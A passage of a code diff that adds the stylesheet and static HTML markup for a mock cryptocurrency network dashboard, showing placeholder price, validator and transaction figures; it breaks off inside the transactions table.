+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+        }
+        
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        
+        .card-title {
+            color: var(--text-secondary);
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .card-icon {
+            width: 36px;
+            height: 36px;
+            background-color: rgba(0, 173, 181, 0.1);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary-color);
+        }
+        
+        .card-value {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        
+        .card-change {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            color: var(--success-color);
+        }
+        
+        .card-change.negative {
+            color: var(--danger-color);
+        }
+        
+        /* Charts Section */
+        .charts-section {
+            margin-bottom: 30px;
+        }
+        
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        
+        .section-title {
+            font-size: 20px;
+            font-weight: 600;
+        }
+        
+        .chart-filters {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .filter-btn {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 6px 12px;
+            color: var(--text-secondary);
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.2s ease;
+        }
+        
+        .filter-btn:hover {
+            background-color: rgba(0, 173, 181, 0.1);
+            color: var(--text-color);
+        }
+        
+        .filter-btn.active {
+            background-color: rgba(0, 173, 181, 0.2);
+            color: var(--primary-color);
+            border-color: var(--primary-color);
+        }
+        
+        .chart-card {
+            background-color: var(--card-bg);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .chart-container {
+            height: 300px;
+            position: relative;
+            width: 100%;
+            overflow: hidden;
+        }
+        
+        .chart-area {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg, 
+                rgba(0, 173, 181, 0.2) 0%, 
+                rgba(0, 173, 181, 0) 100%);
+            clip-path: polygon(
+                0% 80%,
+                5% 75%,
+                10% 78%,
+                15% 70%,
+                20% 72%,
+                25% 65%,
+                30% 68%,
+                35% 60%,
+                40% 63%,
+                45% 55%,
+                50% 58%,
+                55% 50%,
+                60% 53%,
+                65% 45%,
+                70% 48%,
+                75% 40%,
+                80% 43%,
+                85% 35%,
+                90% 38%,
+                95% 30%,
+                100% 33%,
+                100% 100%,
+                0% 100%
+            );
+        }
+        
+        .chart-line {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            fill: none;
+            stroke: var(--primary-color);
+            stroke-width: 3;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+        
+        /* Validators Section */
+        .validators-section {
+            margin-bottom: 30px;
+        }
+        
+        .validators-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 20px;
+        }
+        
+        .validator-card {
+            background-color: var(--card-bg);
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            transition: transform 0.2s ease;
+        }
+        
+        .validator-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .validator-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        
+        .validator-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 8px;
+            background-color: var(--card-bg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            font-weight: bold;
+            border: 1px solid var(--border-color);
+        }
+        
+        .validator-name {
+            font-weight: 600;
+        }
+        
+        .validator-stats {
+            margin-bottom: 16px;
+        }
+        
+        .stat-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+        
+        .stat-label {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+        
+        .stat-value {
+            font-weight: 500;
+        }
+        
+        .progress-bar {
+            height: 8px;
+            width: 100%;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-top: 16px;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
+            border-radius: 4px;
+        }
+        
+        /* Transactions Table */
+        .transactions-section {
+            margin-bottom: 30px;
+        }
+        
+        .transactions-table {
+            width: 100%;
+            border-collapse: separate;
+            border-spacing: 0;
+            background-color: var(--card-bg);
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+        }
+        
+        .transactions-table th {
+            text-align: left;
+            padding: 16px;
+            background-color: rgba(27, 37, 54, 0.8);
+            color: var(--text-secondary);
+            font-weight: 500;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .transactions-table td {
+            padding: 16px;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .transactions-table tr:last-child td {
+            border-bottom: none;
+        }
+        
+        .tx-hash {
+            display: flex;
+            align-items: center;
+        }
+        
+        .tx-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+            background-color: rgba(0, 173, 181, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            color: var(--primary-color);
+        }
+        
+        .tx-id {
+            font-family: 'Roboto Mono', monospace;
+            font-size: 14px;
+        }
+        
+        .status-badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .status-confirmed {
+            background-color: rgba(76, 175, 80, 0.1);
+            color: var(--success-color);
+        }
+        
+        .status-pending {
+            background-color: rgba(255, 152, 0, 0.1);
+            color: var(--warning-color);
+        }
+        
+        .view-all-btn {
+            display: inline-block;
+            padding: 8px 16px;
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: 500;
+            margin-top: 16px;
+            transition: all 0.2s ease;
+        }
+        
+        .view-all-btn:hover {
+            background-color: rgba(0, 173, 181, 0.1);
+        }
+        
+        /* Footer */
+        .footer {
+            margin-top: 50px;
+            padding: 30px 0;
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .footer-brand {
+            display: flex;
+            align-items: center;
+        }
+        
+        .footer-logo {
+            width: 32px;
+            height: 32px;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            border-radius: 6px;
+            margin-right: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        
+        .footer-text {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+        
+        .footer-links {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .footer-link {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.2s ease;
+        }
+        
+        .footer-link:hover {
+            color: var(--primary-color);
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 1024px) {
+            .validators-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .sidebar {
+                transform: translateX(-100%);
+                transition: transform 0.3s ease;
+                position: fixed;
+                z-index: 1000;
+            }
+            
+            .sidebar.active {
+                transform: translateX(0);
+            }
+            
+            .main-content {
+                margin-left: 0;
+            }
+            
+            .mobile-toggle {
+                display: block;
+                cursor: pointer;
+            }
+            
+            .validators-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .overview-cards {
+                grid-template-columns: 1fr;
+            }
+            
+            .transactions-table {
+                display: block;
+                overflow-x: auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="dashboard">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="brand">
+                <div class="brand-logo">S</div>
+                <div class="brand-name">CryptoMonitor</div>
+            </div>
+            
+            <div class="nav-menu">
+                <div class="nav-title">Main</div>
+                <a href="#" class="nav-item active">
+                    <div class="nav-icon">📊</div>
+                    Dashboard
+                </a>
+                <a href="#" class="nav-item">
+                    <div class="nav-icon">🔍</div>
+                    Explorer
+                </a>
+                <a href="#" class="nav-item">
+                    <div class="nav-icon">💎</div>
+                    Validators
+                </a>
+                <a href="#" class="nav-item">
+                    <div class="nav-icon">📈</div>
+                    Analytics
+                </a>
+                
+                <div class="divider"></div>
+                
+                <div class="nav-title">Tools</div>
+                <a href="#" class="nav-item">
+                    <div class="nav-icon">💰</div>
+                    Wallet
+                </a>
+                <a href="#" class="nav-item">
+                    <div class="nav-icon">🧰</div>
+                    Developer
+                </a>
+                <a href="#" class="nav-item">
+                    <div class="nav-icon">📚</div>
+                    Docs
+                </a>
+                
+                <div class="divider"></div>
+                
+                <div class="nav-title">Account</div>
+                <a href="#" class="nav-item">
+                    <div class="nav-icon">⚙</div>
+                    Settings
+                </a>
+                <a href="#" class="nav-item">
+                    <div class="nav-icon">❓</div>
+                    Help Center
+                </a>
+            </div>
+        </div>
+        
+        <!-- Main Content -->
+        <div class="main-content">
+            <div class="container">
+                <!-- Header -->
+                <div class="header">
+                    <h1 class="page-title">Network Dashboard</h1>
+                    <div class="network-selector">
+                        <div class="network-indicator"></div>
+                        <span class="network-name">Mainnet</span>
+                        <span>▼</span>
+                    </div>
+                </div>
+                
+                <!-- Overview Cards -->
+                <div class="overview-cards">
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">CURRENT PRICE</div>
+                            <div class="card-icon">💲</div>
+                        </div>
+                        <div class="card-value">$142.78</div>
+                        <div class="card-change">+3.8% (24h)</div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">MARKET CAP</div>
+                            <div class="card-icon">📊</div>
+                        </div>
+                        <div class="card-value">$58.2B</div>
+                        <div class="card-change">+2.4% (24h)</div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">24H TRANSACTIONS</div>
+                            <div class="card-icon">🔄</div>
+                        </div>
+                        <div class="card-value">3.2M</div>
+                        <div class="card-change">+8.3% (24h)</div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">AVG TX FEE</div>
+                            <div class="card-icon">💸</div>
+                        </div>
+                        <div class="card-value">0.00021</div>
+                        <div class="card-change negative">-1.2% (24h)</div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">CURRENT TPS</div>
+                            <div class="card-icon">⚡</div>
+                        </div>
+                        <div class="card-value">2,347</div>
+                        <div class="card-change">+127 (1h)</div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">TOTAL STAKED</div>
+                            <div class="card-icon">🔒</div>
+                        </div>
+                        <div class="card-value">389.7M</div>
+                        <div class="card-change">+1.2% (24h)</div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">ACTIVE VALIDATORS</div>
+                            <div class="card-icon">👥</div>
+                        </div>
+                        <div class="card-value">1,873</div>
+                        <div class="card-change">+5 (24h)</div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">NETWORK STATUS</div>
+                            <div class="card-icon">🟢</div>
+                        </div>
+                        <div class="card-value">Healthy</div>
+                        <div class="card-change">99.98% Uptime</div>
+                    </div>
+                </div>
+                
+                <!-- Charts Section -->
+                <div class="charts-section">
+                    <div class="section-header">
+                        <h2 class="section-title">Network Performance</h2>
+                        <div class="chart-filters">
+                            <button class="filter-btn">24H</button>
+                            <button class="filter-btn active">7D</button>
+                            <button class="filter-btn">30D</button>
+                            <button class="filter-btn">3M</button>
+                            <button class="filter-btn">1Y</button>
+                            <button class="filter-btn">ALL</button>
+                        </div>
+                    </div>
+                    
+                    <div class="chart-card">
+                        <div class="chart-container">
+                            <svg width="100%" height="100%" viewBox="0 0 800 300" preserveAspectRatio="none">
+                                <path class="chart-line" d="M0,240 C50,220 100,230 150,210 C200,190 250,200 300,180 C350,160 400,170 450,150 C500,130 550,140 600,120 C650,100 700,110 750,90 C800,70" fill="none" stroke="#00ADB5" stroke-width="3"></path>
+                            </svg>
+                            <div class="chart-area"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Validators Section -->
+                <div class="validators-section">
+                    <div class="section-header">
+                        <h2 class="section-title">Top Validators</h2>
+                        <a href="#" class="view-all-btn">View All</a>
+                    </div>
+                    
+                    <div class="validators-grid">
+                        <div class="validator-card">
+                            <div class="validator-header">
+                                <div class="validator-icon">V1</div>
+                                <div class="validator-name">MainNode Validator</div>
+                            </div>
+                            <div class="validator-stats">
+                                <div class="stat-row">
+                                    <div class="stat-label">Stake</div>
+                                    <div class="stat-value">5.4M</div>
+                                </div>
+                                <div class="stat-row">
+                                    <div class="stat-label">Commission</div>
+                                    <div class="stat-value">5%</div>
+                                </div>
+                                <div class="stat-row">
+                                    <div class="stat-label">Uptime</div>
+                                    <div class="stat-value">99.97%</div>
+                                </div>
+                            </div>
+                            <div class="progress-bar">
+                                <div class="progress-fill" style="width: 95%;"></div>
+                            </div>
+                        </div>
+                        
+                        <div class="validator-card">
+                            <div class="validator-header">
+                                <div class="validator-icon">V2</div>
+                                <div class="validator-name">CryptoMax</div>
+                            </div>
+                            <div class="validator-stats">
+                                <div class="stat-row">
+                                    <div class="stat-label">Stake</div>
+                                    <div class="stat-value">4.8M</div>
+                                </div>
+                                <div class="stat-row">
+                                    <div class="stat-label">Commission</div>
+                                    <div class="stat-value">6%</div>
+                                </div>
+                                <div class="stat-row">
+                                    <div class="stat-label">Uptime</div>
+                                    <div class="stat-value">99.95%</div>
+                                </div>
+                            </div>
+                            <div class="progress-bar">
+                                <div class="progress-fill" style="width: 92%;"></div>
+                            </div>
+                        </div>
+                        
+                        <div class="validator-card">
+                            <div class="validator-header">
+                                <div class="validator-icon">V3</div>
+                                <div class="validator-name">StakeHouse</div>
+                            </div>
+                            <div class="validator-stats">
+                                <div class="stat-row">
+                                    <div class="stat-label">Stake</div>
+                                    <div class="stat-value">4.2M</div>
+                                </div>
+                                <div class="stat-row">
+                                    <div class="stat-label">Commission</div>
+                                    <div class="stat-value">5.5%</div>
+                                </div>
+                                <div class="stat-row">
+                                    <div class="stat-label">Uptime</div>
+                                    <div class="stat-value">99.92%</div>
+                                </div>
+                            </div>
+                            <div class="progress-bar">
+                                <div class="progress-fill" style="width: 88%;"></div>
+                            </div>
+                        </div>
+                        
+                        <div class="validator-card">
+                            <div class="validator-header">
+                                <div class="validator-icon">V4</div>
+                                <div class="validator-name">NodeGuru</div>
+                            </div>
+                            <div class="validator-stats">
+                                <div class="stat-row">
+                                    <div class="stat-label">Stake</div>
+                                    <div class="stat-value">3.9M</div>
+                                </div>
+                                <div class="stat-row">
+                                    <div class="stat-label">Commission</div>
+                                    <div class="stat-value">7%</div>
+                                </div>
+                                <div class="stat-row">
+                                    <div class="stat-label">Uptime</div>
+                                    <div class="stat-value">99.90%</div>
+                                </div>
+                            </div>
+                            <div class="progress-bar">
+                                <div class="progress-fill" style="width: 85%;"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Transactions Section -->
+                <div class="transactions-section">
+                    <div class="section-header">
+                        <h2 class="section-title">Recent Transactions</h2>
+                        <a href="#" class="view-all-btn">View All</a>
+                    </div>
+                    
+                    <table class="transactions-table">
+                        <thead>
+                            <tr>
+                                <th>Transaction</th>
+                                <th>Block</th>
+                                <th>Age</th>
+                                <th>Status</th>
+                                <th>Fee</th>
+                                <th>Value</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+
+                                <td>
+                                    <div class="tx-hash">
+                                        <span class="hash-text">0x7ef...2d9b</span>
+                                        <span class="tx-type">Transfer</span>
+                                    </div>
+                                </td>
+                                <td>219,445</td>
+                                <td>2 mins ago</td>
+                                <td><span class="status success">Success</span></td>
+                                <td>0.000042 SOL</td>
+                                <td>12.5 SOL</td>
+                            </tr>
+                            <tr>
+                                <td>
+                                    <div class="tx-hash">
+                                        <span class="hash-text">0x3ab...8f4c</span>
+                                        <span class="tx-type">Swap</span>
+                                    </div>
+                                </td>
+                                <td>219,444</td>
+                                <td>5 mins ago</td>
+                                <td><span class="status success">Success</span></td>
+                                <td>0.000038 SOL</td>
+                                <td>5.2 SOL</td>
+                            </tr>
+                            <tr>
+                                <td>
+                                    <div class="tx-hash">
+                                        <span class="hash-text">0x9dc...1e5a</span>
+                                        <span class="tx-type">Stake</span>
+                                    </div>
+                                </td>
+                                <td>219,443</td>
+                                <td>8 mins ago</td>
+                                <td><span class="status pending">Pending</span></td>
+                                <td>0.000051 SOL</td>
+                                <td>100 SOL</td>
+                            </tr>
+
+
